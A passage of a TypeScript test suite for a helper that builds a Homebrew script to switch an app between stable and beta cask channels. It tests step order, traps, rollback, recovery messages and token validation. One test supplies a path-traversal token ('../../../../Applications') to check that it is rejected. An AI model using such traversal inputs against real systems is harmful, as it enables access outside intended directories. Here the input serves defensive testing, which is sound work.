    value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");

  const BREW = "/opt/homebrew/bin/brew";

  // Anchored on both ends: the quoted brew path rules out "install" matching
  // inside "uninstall", and the trailing lookahead rules out "fixlang" matching
  // inside "fixlang@beta", while still allowing `;`, a quote or whitespace.
  const caskCommandPattern = (verb: string, token: string): RegExp =>
    new RegExp(
      `"${escapeRegExp(BREW)}" ${verb} --cask ${escapeRegExp(token)}(?![A-Za-z0-9@])`,
      "g",
    );

  const indexOfCaskCommand = (
    script: string,
    verb: string,
    token: string,
    fromIndex = 0,
  ): number => {
    const pattern = caskCommandPattern(verb, token);
    pattern.lastIndex = fromIndex;
    const match = pattern.exec(script);
    return match ? match.index : -1;
  };

  /** Every occurrence, so a test can bound a count instead of only ordering. */
  const indicesOfCaskCommand = (
    script: string,
    verb: string,
    token: string,
  ): readonly number[] =>
    [...script.matchAll(caskCommandPattern(verb, token))].map((match) => match.index);

  const script = buildChannelSwitchScript(
    "/opt/homebrew/bin/brew",
    STABLE_CASK_TOKEN,
    BETA_CASK_TOKEN,
  );

  const pgrepIdx = script.indexOf("/usr/bin/pgrep -x FixLang");
  const fetchIdx = indexOfCaskCommand(script, "fetch", BETA_CASK_TOKEN);
  const uninstallIdx = indexOfCaskCommand(script, "uninstall", STABLE_CASK_TOKEN);
  const firstInstallIdx = indexOfCaskCommand(script, "install", BETA_CASK_TOKEN);
  const secondInstallIdx =
    firstInstallIdx === -1
      ? -1
      : indexOfCaskCommand(script, "install", BETA_CASK_TOKEN, firstInstallIdx + 1);
  const restoreSearchStart = Math.max(uninstallIdx, secondInstallIdx) + 1;
  const restoreIdx = indexOfCaskCommand(
    script,
    "install",
    STABLE_CASK_TOKEN,
    restoreSearchStart,
  );
  const trapIdx = script.indexOf("trap reopen_fixlang EXIT");
  const signalTrapIdx = script.indexOf("trap abort_without_reopen ");
  const waitLoopEndIdx = script.indexOf("\ndone\n");

  const switchScript = (brew: string): string =>
    buildChannelSwitchScript(brew, STABLE_CASK_TOKEN, BETA_CASK_TOKEN, APP_PATH);

  it("waits for the app to exit before touching either cask", () => {
    expect(pgrepIdx).toBeGreaterThanOrEqual(0);
    expect(pgrepIdx).toBeLessThan(fetchIdx);
  });

  // The fetch must fill the download cache while the CURRENT cask is installed.
  it("fetches the target cask before uninstalling the current one", () => {
    expect(fetchIdx).toBeGreaterThanOrEqual(0);
    expect(uninstallIdx).toBeGreaterThanOrEqual(0);
    expect(fetchIdx).toBeLessThan(uninstallIdx);
  });

  // The target's bundle path only frees up once the current cask is gone.
  it("uninstalls the current cask before installing the target", () => {
    expect(uninstallIdx).toBeGreaterThanOrEqual(0);
    expect(firstInstallIdx).toBeGreaterThanOrEqual(0);
    expect(uninstallIdx).toBeLessThan(firstInstallIdx);
  });

  // "Exactly once" is an upper bound, so it has to be a COUNT: ordering alone
  // holds for any number of attempts, each stretching the no-app window. Counted
  // before the restore, whose last-resort attempt is not a retry of the switch.
  it("retries the target install exactly once before giving up on it", () => {
    expect(firstInstallIdx).toBeGreaterThanOrEqual(0);
    expect(secondInstallIdx).toBeGreaterThan(firstInstallIdx);
    expect(restoreIdx).toBeGreaterThan(secondInstallIdx);

    const attemptsBeforeRestore = indicesOfCaskCommand(
      script,
      "install",
      BETA_CASK_TOKEN,
    ).filter((index) => index < restoreIdx);

    expect(attemptsBeforeRestore).toEqual([firstInstallIdx, secondInstallIdx]);
  });

  it("makes exactly one last-resort target attempt after a failed restore", () => {
    const attemptsAfterRestore = indicesOfCaskCommand(
      script,
      "install",
      BETA_CASK_TOKEN,
    ).filter((index) => index > restoreIdx);

    expect(attemptsAfterRestore).toHaveLength(1);
  });

  // A failed switch must leave the user where they started, not with nothing.
  it("restores the ORIGINAL token — not the target — after both install attempts fail", () => {
    expect(restoreIdx).toBeGreaterThanOrEqual(0);
    expect(restoreIdx).toBeGreaterThan(secondInstallIdx);
  });

  // One EXIT trap armed the moment the app is gone, so the invariant is stated
  // once instead of per branch. A `lastIndexOf(reopen) > restoreIdx` check
  // resolves to the success-path reopen and holds whatever the branch contains.
  it("arms the reopen for every exit path the moment the app is gone", () => {
    expect(trapIdx).toBeGreaterThan(waitLoopEndIdx);
    expect(trapIdx).toBeLessThan(fetchIdx);
    // Two traps and no more: the EXIT reopen and the signal abort that is its one
    // deliberate exception. `trap - EXIT` appears only in the signal handler.
    expect(script.match(/^trap /gm)).toHaveLength(2);
    expect(script.match(/^ *trap - EXIT$/gm)).toHaveLength(1);
    expect(signalTrapIdx).toBeGreaterThan(trapIdx);
    expect(signalTrapIdx).toBeLessThan(fetchIdx);
    // Both traps name a function, never inline text: a bundle path holding a
    // quote would otherwise escape the trap's own quoting.
    expect(script).toContain("reopen_fixlang() {");
    expect(script).toContain("abort_without_reopen() {");
  });

  it("reopens the app it made quit when the target fetch fails", () => {
    const { trace, status } = runHelperScript(switchScript, ["fetch:fixlang@beta"]);

    // Nothing was uninstalled, so the user is still running the app.
    expect(trace).toEqual(["brew fetch fixlang@beta", REOPENED]);
    expect(status).toBe(1);
  });

  // A cask uninstall that fails partway can already have removed the bundle, so
  // an abort here leaves no app in /Applications and no indication why.
  it("reinstalls the current cask and reopens when the uninstall fails", () => {
    const { trace, status, stderr } = runHelperScript(switchScript, ["uninstall:fixlang"]);

    expect(trace).toEqual([
      "brew fetch fixlang@beta",
      "brew fetch fixlang",
      "brew uninstall fixlang",
      "brew install fixlang",
      REOPENED,
    ]);
    expect(stderr).toContain("Failed to uninstall fixlang");
    expect(status).toBe(1);
  });

  it("restores the original token and reopens when both target installs fail", () => {
    const { trace, status } = runHelperScript(switchScript, ["install:fixlang@beta"]);

    expect(trace).toEqual([
      "brew fetch fixlang@beta",
      "brew fetch fixlang",
      "brew uninstall fixlang",
      "brew install fixlang@beta",
      "brew install fixlang@beta",
      "brew install fixlang",
      REOPENED,
    ]);
    expect(status).toBe(1);
  });

  // With the rollback itself failed the user has NO app, so the wrong channel
  // beats none, and the target's DMG is the one still cached. Asserted on stderr
  // and status: success used to differ from failure only by an ABSENT log line.
  it("reports the channel it landed on when the restore fails but the target installs", () => {
    const { trace, status, stderr } = runHelperScript(switchScript, [
      "install:fixlang@beta#1",
      "install:fixlang@beta#2",
      "install:fixlang",
    ]);

    expect(trace.at(-2)).toBe("brew install fixlang@beta");
    expect(trace.at(-1)).toBe(REOPENED);
    expect(stderr).toContain("FixLang is on the fixlang@beta channel");
    // The switch landed on the requested channel, so it is not a failure.
    expect(status).toBe(0);
  });

  // A rollback that WORKS is still a failed switch, and has to say which of the
  // two happened rather than leave it inferred from which line came last.
  it("says the switch did not happen when the rollback succeeds", () => {
    const { status, stderr } = runHelperScript(switchScript, ["install:fixlang@beta"]);

    expect(stderr).toContain("Restored fixlang; the switch to fixlang@beta did not happen.");
    expect(status).toBe(1);
  });

  // No app is left running to report through, so the log is the only channel.
  it("names the one command that recovers the machine when nothing installs", () => {
    const { stderr, status } = runHelperScript(switchScript, [
      "install:fixlang@beta",
      "install:fixlang",
    ]);

    expect(stderr).toContain("Failed to restore fixlang");
    expect(stderr).toContain("Recover with: brew install --cask fixlang@beta");
    expect(status).toBe(1);
  });

  // Asserts the two tokens APART, never a prefix match: `toContain("--cask
  // fixlang")` passes on either script. The line used to name `currentToken`, so a
  // revert handed a user with no app `brew install --cask fixlang@beta`.
  it("names the REQUESTED channel in the recovery line, in both directions", () => {
    const revertScript = (brew: string): string =>
      buildChannelSwitchScript(brew, BETA_CASK_TOKEN, STABLE_CASK_TOKEN, APP_PATH);
    const { stderr, status } = runHelperScript(revertScript, [
      "install:fixlang",
      "install:fixlang@beta",
    ]);

    expect(stderr).toContain("Recover with: brew install --cask fixlang\n");
    expect(stderr).not.toContain("Recover with: brew install --cask fixlang@beta");
    expect(status).toBe(1);
  });

  it("pre-stages the rollback download but never blocks the switch on it", () => {
    const { trace, status, stderr } = runHelperScript(switchScript, ["fetch:fixlang"]);

    expect(trace).toEqual([
      "brew fetch fixlang@beta",
      "brew fetch fixlang",
      "brew uninstall fixlang",
      "brew install fixlang@beta",
      REOPENED,
    ]);
    expect(stderr).toContain("Could not pre-stage the fixlang download");
    expect(status).toBe(0);
  });

  it("switches and reopens with no brew step failing", () => {
    expect(runHelperScript(switchScript)).toMatchObject({
      trace: [
        "brew fetch fixlang@beta",
        "brew fetch fixlang",
        "brew uninstall fixlang",
        "brew install fixlang@beta",
        REOPENED,
      ],
      status: 0,
    });
  });

  it("never emits --zap or --force", () => {
    expect(script).not.toContain("--zap");
    expect(script).not.toContain("--force");
  });

  it("refuses to build a script naming an unknown current or target token", () => {
    expect(() =>
      buildChannelSwitchScript(
        "/opt/homebrew/bin/brew",
        "fixlang-nightly",
        BETA_CASK_TOKEN,
      ),
    ).toThrow();
    expect(() =>
      buildChannelSwitchScript(
        "/opt/homebrew/bin/brew",
        STABLE_CASK_TOKEN,
        "fixlang-nightly",
      ),
    ).toThrow();
  });

  it("refuses to switch a token to itself", () => {
    expect(() =>
      buildChannelSwitchScript(
        "/opt/homebrew/bin/brew",
        STABLE_CASK_TOKEN,
        STABLE_CASK_TOKEN,
      ),
    ).toThrow();
  });

  // Tokens reversed, so this is not an artifact of one token being the default.
  it("names the correct original token when the switch direction is reversed", () => {
    const revert = buildChannelSwitchScript(
      "/opt/homebrew/bin/brew",
      BETA_CASK_TOKEN,
      STABLE_CASK_TOKEN,
    );
    const revertUninstallIdx = indexOfCaskCommand(revert, "uninstall", BETA_CASK_TOKEN);
    const revertRestoreIdx = indexOfCaskCommand(
      revert,
      "install",
      BETA_CASK_TOKEN,
      revertUninstallIdx + 1,
    );
    expect(revertUninstallIdx).toBeGreaterThanOrEqual(0);
    expect(revertRestoreIdx).toBeGreaterThan(revertUninstallIdx);
  });
});

describe("canInstall validates the bound cask token", () => {
  // `caskroomRoot(brew, "../../../../Applications")` normalizes to
  // "/Applications", so an unvalidated token probes outside the Caskroom entirely.
  it("never derives canInstall from an unrecognized token's raw, un-validated path", () => {
    const { instance } = upgrader({
      caskToken: "../../../../Applications",
      directories: ["/Applications"],
    });

    expect(instance.canInstall).toBe(false);
  });
});

describe("startUpgrade validates the token it is actually about to run, not just the bound one", () => {
  // `canInstall` is fixed at construction for the BOUND token, so a `!canInstall`
  // guard lets a per-call override upgrade a token with no Caskroom entry — after
  // the app has quit, on the failure path that never reaches the reopen.
  it("refuses a per-call token override the bound token's canInstall can't vouch for", () => {
    const { instance, startDetached } = upgrader({
      caskToken: BETA_CASK_TOKEN,
      directories: ["/opt/homebrew/Caskroom/fixlang@beta"],
    });

    expect(() => instance.startUpgrade(null, STABLE_CASK_TOKEN)).toThrow(
      "FixLang was not installed with the Homebrew cask",
    );
    expect(startDetached).not.toHaveBeenCalled();
  });
});

describe("per-call token pins its own accessor, never the bound token's", () => {
  // Every other beta test omits the per-call argument, so it only proves bound ==
  // per-call. `updateService.ts` passes `pending.caskToken`, which legitimately
  // differs from the bound token whenever the app reopens mid switch.
  it("checks the per-call token's own Caskroom entry, not the bound token's", () => {
    const { instance } = upgrader({
      caskToken: BETA_CASK_TOKEN,
      directories: [
        "/opt/homebrew/Caskroom/fixlang",
        "/opt/homebrew/Caskroom/fixlang/0.32.0",
      ],
    });

    expect(instance.isVersionInstalled("0.32.0", STABLE_CASK_TOKEN)).toBe(true);
    expect(instance.isVersionInstalled("0.32.0", BETA_CASK_TOKEN)).toBe(false);
  });

  // The beta `brew fetch` test passes no argument, so it only proves bound ==
  // per-call. The real call site always passes the TARGET token on a switch.
  it("passes the per-call token to `brew fetch`, not the bound token's", async () => {
    const { instance, runBrew } = upgrader({
      caskToken: BETA_CASK_TOKEN,
      directories: ["/opt/homebrew/Caskroom/fixlang@beta"],
    });

    await instance.downloadUpdate(STABLE_CASK_TOKEN);

    expect(runBrew.mock.calls.map(([, args]) => [...args])).toEqual([
      ["fetch", "--cask", STABLE_CASK_TOKEN],
    ]);
  });

  // Nothing else pins the token that reaches the emitted script: the beta test
  // passes no argument, and the differing-token test above asserts a throw.
  it("passes the per-call token to the emitted script, not the bound token's", () => {
    const { instance, startDetached } = upgrader({
      caskToken: BETA_CASK_TOKEN,
      directories: [
        "/opt/homebrew/Caskroom/fixlang@beta",
        "/opt/homebrew/Caskroom/fixlang",
      ],
    });

    instance.startUpgrade(null, STABLE_CASK_TOKEN);

    expect(startDetached).toHaveBeenCalledWith(
      buildUpgradeScript("/opt/homebrew/bin/brew", null, STABLE_CASK_TOKEN),
      "/tmp/userData/logs/homebrew-update.log",
    );
  });
});
